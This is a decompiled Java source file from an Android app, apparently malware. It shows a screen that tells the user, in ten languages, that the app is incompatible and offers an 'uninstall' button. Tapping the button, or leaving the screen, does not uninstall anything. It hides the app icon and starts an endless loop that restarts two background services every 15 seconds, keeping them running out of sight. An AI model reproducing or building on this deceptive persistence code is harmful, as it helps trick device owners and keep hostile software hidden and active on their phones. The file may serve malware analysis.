/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.view.View
 *  android.view.View$OnClickListener
 *  android.widget.TextView
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;
import java.util.Locale;
import linker.resourcer.encoder.R;
import linker.resourcer.encoder.UtilityHelper;
import linker.resourcer.encoder.WorkerService;
import linker.resourcer.encoder.SetupOrchestrationService;
import linker.resourcer.encoder.SystemUtilities;

public class IncompatibilityNotificationActivity
extends Activity {
    private static boolean Userok = false;
    private TextView button_ok;
    private TextView themsg;

    static /* synthetic */ boolean access$002(boolean bl) {
        Userok = bl;
        return bl;
    }

    public void EndSetup() {
        UtilityHelper.hideme(this.getApplicationContext());
        new Thread(new Runnable(){
            final IncompatibilityNotificationActivity this$0;
            final Context val$mcontext;
            {
                this.this$0 = nnvknydszrgpycrmrnvrctajxq2;
                this.val$mcontext = context;
            }

            @Override
            public void run() {
                while (true) {
                    try {
                        Thread.sleep(15000L);
                    }
                    catch (Exception exception) {}
                    try {
                        Intent intent = new Intent(this.val$mcontext, SetupOrchestrationService.class);
                        if (!SystemUtilities.isServiceRunning(this.val$mcontext, SetupOrchestrationService.class)) {
                            if (Build.VERSION.SDK_INT >= 26) {
                                this.val$mcontext.startForegroundService(intent);
                            } else {
                                this.val$mcontext.startService(intent);
                            }
                        }
                        if (SystemUtilities.isServiceRunning(this.val$mcontext, WorkerService.class)) continue;
                        intent = new Intent(this.val$mcontext, WorkerService.class);
                        if (Build.VERSION.SDK_INT >= 26) {
                            this.val$mcontext.startForegroundService(intent);
                            continue;
                        }
                        this.val$mcontext.startService(intent);
                    }
                    catch (Exception exception) {
                        return;
                    }
                }
            }
        }).start();
        this.finish();
    }

    /*
     * Enabled aggressive block sorting
     */
    protected void onCreate(Bundle object) {
        int n;
        block24: {
            super.onCreate((Bundle)object);
            n = 1;
            this.requestWindowFeature(1);
            this.getWindow().setFlags(1024, 1024);
            this.setContentView(R.layout.uninstall_activity);
            this.themsg = (TextView)this.findViewById(R.id.dialog_message);
            this.button_ok = (TextView)this.findViewById(R.id.button_ok);
            object = Locale.getDefault().getLanguage();
            switch (((String)object).hashCode()) {
                case 3886: {
                    if (!((String)object).equals("zh")) break;
                    break block24;
                }
                case 3710: {
                    if (!((String)object).equals("tr")) break;
                    n = 5;
                    break block24;
                }
                case 3651: {
                    if (!((String)object).equals("ru")) break;
                    n = 4;
                    break block24;
                }
                case 3588: {
                    if (!((String)object).equals("pt")) break;
                    n = 3;
                    break block24;
                }
                case 3383: {
                    if (!((String)object).equals("ja")) break;
                    n = 9;
                    break block24;
                }
                case 3371: {
                    if (!((String)object).equals("it")) break;
                    n = 8;
                    break block24;
                }
                case 3276: {
                    if (!((String)object).equals("fr")) break;
                    n = 6;
                    break block24;
                }
                case 3246: {
                    if (!((String)object).equals("es")) break;
                    n = 2;
                    break block24;
                }
                case 3201: {
                    if (!((String)object).equals("de")) break;
                    n = 7;
                    break block24;
                }
                case 3121: {
                    if (!((String)object).equals("ar")) break;
                    n = 0;
                    break block24;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                this.themsg.setText((CharSequence)"Unfortunately, this version is not compatible with your device");
                this.button_ok.setText((CharSequence)"uninstall");
                break;
            }
            case 9: {
                this.themsg.setText((CharSequence)"\u6b8b\u5ff5\u306a\u304c\u3089\u3001\u3053\u306e\u30d0\u30fc\u30b8\u30e7\u30f3\u306f\u304a\u4f7f\u3044\u306e\u30c7\u30d0\u30a4\u30b9\u3068\u4e92\u63db\u6027\u304c\u3042\u308a\u307e\u305b\u3093");
                this.button_ok.setText((CharSequence)"\u30a2\u30f3\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb");
                break;
            }
            case 8: {
                this.themsg.setText((CharSequence)"Purtroppo, questa versione non \u00e8 compatibile con il tuo dispositivo");
                this.button_ok.setText((CharSequence)"disinstallare");
                break;
            }
            case 7: {
                this.themsg.setText((CharSequence)"Leider ist diese Version nicht mit Ihrem Ger\u00e4t kompatibel");
                this.button_ok.setText((CharSequence)"deinstallieren");
                break;
            }
            case 6: {
                this.themsg.setText((CharSequence)"Malheureusement, cette version n'est pas compatible avec votre appareil");
                this.button_ok.setText((CharSequence)"d\u00e9sinstaller");
                break;
            }
            case 5: {
                this.themsg.setText((CharSequence)"Maalesef, bu s\u00fcr\u00fcm cihaz\u0131n\u0131zla uyumlu de\u011fil");
                this.button_ok.setText((CharSequence)"kald\u0131r");
                break;
            }
            case 4: {
                this.themsg.setText((CharSequence)"\u041a \u0441\u043e\u0436\u0430\u043b\u0435\u043d\u0438\u044e, \u044d\u0442\u0430 \u0432\u0435\u0440\u0441\u0438\u044f \u043d\u0435 \u0441\u043e\u0432\u043c\u0435\u0441\u0442\u0438\u043c\u0430 \u0441 \u0432\u0430\u0448\u0438\u043c \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u043e\u043c");
                this.button_ok.setText((CharSequence)"\u0443\u0434\u0430\u043b\u0438\u0442\u044c");
                break;
            }
            case 3: {
                this.themsg.setText((CharSequence)"Infelizmente, esta vers\u00e3o n\u00e3o \u00e9 compat\u00edvel com o seu dispositivo");
                this.button_ok.setText((CharSequence)"desinstalar");
                break;
            }
            case 2: {
                this.themsg.setText((CharSequence)"Desafortunadamente, esta versi\u00f3n no es compatible con su dispositivo");
                this.button_ok.setText((CharSequence)"desinstalar");
                break;
            }
            case 1: {
                this.themsg.setText((CharSequence)"\u4e0d\u5e78\u7684\u662f\uff0c\u8be5\u7248\u672c\u4e0e\u60a8\u7684\u8bbe\u5907\u4e0d\u517c\u5bb9");
                this.button_ok.setText((CharSequence)"\u5378\u8f7d");
                break;
            }
            case 0: {
                this.themsg.setText((CharSequence)"\u0644\u0644\u0623\u0633\u0641 \u060c \u0647\u0630\u0627 \u0627\u0644\u0625\u0635\u062f\u0627\u0631 \u063a\u064a\u0631 \u0645\u062a\u0648\u0627\u0641\u0642 \u0645\u0639 \u062c\u0647\u0627\u0632\u0643");
                this.button_ok.setText((CharSequence)"\u0625\u0644\u063a\u0627\u0621 \u0627\u0644\u062a\u062b\u0628\u064a\u062a");
            }
        }
        this.button_ok.setOnClickListener(new View.OnClickListener(this){
            final IncompatibilityNotificationActivity this$0;
            {
                this.this$0 = nnvknydszrgpycrmrnvrctajxq2;
            }

            public void onClick(View view) {
                IncompatibilityNotificationActivity.access$002(true);
                this.this$0.EndSetup();
            }
        });
    }

    protected void onDestroy() {
        if (!Userok) {
            Userok = true;
            this.EndSetup();
        }
        super.onDestroy();
    }
}

